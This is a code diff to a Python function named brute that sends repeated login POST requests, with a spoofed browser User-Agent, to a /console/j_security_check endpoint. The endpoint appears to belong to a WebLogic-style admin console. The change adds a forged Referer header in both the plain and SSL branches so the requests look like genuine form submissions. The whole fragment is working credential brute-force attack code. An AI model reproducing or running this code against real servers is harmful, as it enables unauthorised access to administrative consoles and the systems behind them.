@@ -30,7 +30,7 @@ def brute(ip,port):
         try:
             client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             client1.connect((ip,int(port)))
-            client1.sendall(str.encode('''POST /console/j_security_check HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length,''.join(payload()[i]))))
+            client1.sendall(str.encode('''POST /console/j_security_check HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://{}:{}/console/login/LoginForm.jsp\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,ip,port,content_length,''.join(payload()[i]))))
 
             buf1 = "" 
             buf = "1"
@@ -54,7 +54,7 @@ def brute(ip,port):
         try:
             client2 = ssl.wrap_socket(socket.socket())
             client2.connect((ip,int(port)))
-            client2.sendall(str.encode('''POST /console/j_security_check HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length,''.join(payload()[i]))))
+            client2.sendall(str.encode('''POST /console/j_security_check HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: https://{}:{}/console/login/LoginForm.jsp\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,ip,port,content_length,''.join(payload()[i]))))
             buf1 = ""                                                  
             buf = "1"
             while len(buf):
